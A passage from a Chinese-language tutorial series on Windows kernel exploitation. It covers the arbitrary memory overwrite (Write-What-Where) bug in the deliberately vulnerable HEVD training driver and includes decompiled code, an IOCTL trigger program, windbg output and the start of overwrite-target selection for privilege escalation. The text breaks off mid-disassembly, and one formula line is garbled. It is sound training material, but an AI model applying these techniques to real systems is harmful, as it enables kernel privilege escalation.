# 0x00：前言
这是 Windows kernel exploit 系列的第三部分，前一篇我们讲了内核栈溢出的利用，这一篇我们介绍任意内存覆盖漏洞，也就是 Write-What-Where 漏洞，和前面一样，看此文章之前你需要有以下准备：
  * Windows 7 x86 sp1虚拟机
  * 配置好windbg等调试工具，建议配合VirtualKD使用
  * HEVD+OSR Loader配合构造漏洞环境
传送门：
[+][Windows Kernel Exploit(一) -> UAF](https://xz.aliyun.com/t/5493)
[+][Windows Kernel Exploit(二) -> StackOverflow](https://xz.aliyun.com/t/5536)
# 0x01：漏洞原理
## 任意内存覆盖漏洞
从 IDA
中我们直接分析`HEVD.sys`中的`TriggerArbitraryOverwrite`函数，乍一看没啥毛病，仔细分析发现v1，v2这俩指针都没有验证地址是否有效就直接拿来用了，这是内核态，给点面子好吧，胡乱引用可以要蓝屏的(严肃
    int __stdcall TriggerArbitraryOverwrite(_WRITE_WHAT_WHERE *UserWriteWhatWhere)
    {
      unsigned int *v1; // edi
      unsigned int *v2; // ebx
      ProbeForRead(UserWriteWhatWhere, 8u, 4u);
      v1 = UserWriteWhatWhere->What;
      v2 = UserWriteWhatWhere->Where;
      DbgPrint("[+] UserWriteWhatWhere: 0x%p\n", UserWriteWhatWhere);
      DbgPrint("[+] WRITE_WHAT_WHERE Size: 0x%X\n", 8);
      DbgPrint("[+] UserWriteWhatWhere->What: 0x%p\n", v1);
      DbgPrint("[+] UserWriteWhatWhere->Where: 0x%p\n", v2);
      DbgPrint("[+] Triggering Arbitrary Overwrite\n");
      *v2 = *v1;
      return 0;
    }
我们从`ArbitraryOverwrite.c`源码文件入手，直接定位关键点
    #ifdef SECURE
            // Secure Note: This is secure because the developer is properly validating if address
            // pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead()
            // routine before performing the write operation
            ProbeForRead((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));
            ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(PULONG_PTR));
            *(Where) = *(What);
    #else
            DbgPrint("[+] Triggering Arbitrary Overwrite\n");
            // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
            // because the developer is writing the value pointed by 'What' to memory location
            // pointed by 'Where' without properly validating if the values pointed by 'Where'
            // and 'What' resides in User mode
            *(Where) = *(What);
如果你不清楚`ProbeForRead`函数的话，[这里](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-probeforread)可以得到很官方的解释(永远记住官方文档是最好的)，就是检查用户模式缓冲区是否实际驻留在地址空间的用户部分中，并且正确对齐，相当于检查一块内存是否正确。
    void ProbeForRead(
      const volatile VOID *Address,
      SIZE_T              Length,
      ULONG               Alignment
    );
和我们设想的一样，从刚才上面的对比处可以很清楚的看出，在安全的条件下，我们在使用两个指针的时候对指针所指向的地址进行了验证，如果不对地址进行验证，在内核空间中访问到了不该访问的内存那很可能就会蓝屏，通过这一点我们就可以利用，既然是访问内存，那我们让其访问我们shellcode的位置即可达到提权的效果，那么怎么才能访问到我们的shellcode呢？
# 0x02：漏洞利用
## 利用原理
### 控制码
知道了漏洞的原理之后我们开始构造exploit，前面我们通过分析`IrpDeviceIoCtlHandler`函数可以逆向出每个函数对应的控制码，然而这个过程我们可以通过分析`HackSysExtremeVulnerableDriver.h`自己计算出控制码，源码中的定义如下
    #define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
下面解释一下如何计算控制码，`CTL_CODE`这个宏负责创建一个独特的系统I/O（输入输出）控制代码(IOCTL)，计算公式如下
    #define xxx_xxx_xxx CTL_CODE(DeviceType, Function, Method, Access)
    ( ((DeviceType) >> hex((0x00000022 
    #include
    int main()
    {
        char buf[8];
        DWORD recvBuf;
        // 获取句柄
        HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        printf("Start to get HANDLE...\n");
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            printf("Failed to get HANDLE!!!\n");
            return 0;
        }
        memset(buf, 'A', 8);
        DeviceIoControl(hDevice, 0x22200b, buf, 8, NULL, 0, &recvBuf, NULL);
        return 0;
    }
在 windbg 中如果不能显示出 dbgprint 中内容的话输入下面的这条命令即可显示
    ed nt!Kd_DEFAULT_Mask 8
我们运行刚才生成的程序，如我们所愿，这里已经成功调用了`ArbitraryOverwriteIoctlHandler`函数并且修改了 What 和
Where 指针
    kd> ed nt!Kd_DEFAULT_Mask 8
    kd> g
    ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
    [+] UserWriteWhatWhere: 0x0019FC90
    [+] WRITE_WHAT_WHERE Size: 0x8
    [+] UserWriteWhatWhere->What: 0x41414141
    [+] UserWriteWhatWhere->Where: 0x41414141
    [+] Triggering Arbitrary Overwrite
    [-] Exception Code: 0xC0000005
    ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ******
当然我们不能只修改成0x41414141，我们所希望的是把what指针覆盖为shellcode的地址，where指针修改为能指向shellcode地址的指针
### Where & What 指针
这里的where指针我们希望能够覆盖到一个安全可靠的地址，我们在windbg中反编译一下`NtQueryIntervalProfile+0x62`这个位置
    kd> u nt!NtQueryIntervalProfile+0x62
    nt!NtQueryIntervalProfile+0x62:
    84159ecd 7507            jne     nt!NtQueryIntervalProfile+0x6b (84159ed6)
    84159ecf a1ac7bf783      mov     eax,dword ptr [nt!KiProfileInterval (83f77bac)]
    84159ed4 eb05            jmp     nt!NtQueryIntervalProfile+0x70 (84159edb)
    84159ed6 e83ae5fbff      call    nt!KeQueryIntervalProfile (84118415)
    84159edb 84db            test    bl,bl
    84159edd 741b            je      nt!NtQueryIntervalProfile+0x8f (84159efa)
    84159edf c745fc01000000  mov     dword ptr [ebp-4],1
    84159ee6 8906            mov     dword ptr [esi],eax
上面可以发现，`0x84159ed6`这里会调用到一个函数`KeQueryIntervalProfile`，我们继续跟进
    2: kd> u KeQueryIntervalProfile
    nt!KeQueryIntervalProfile:
    840cc415 8bff            mov     edi,edi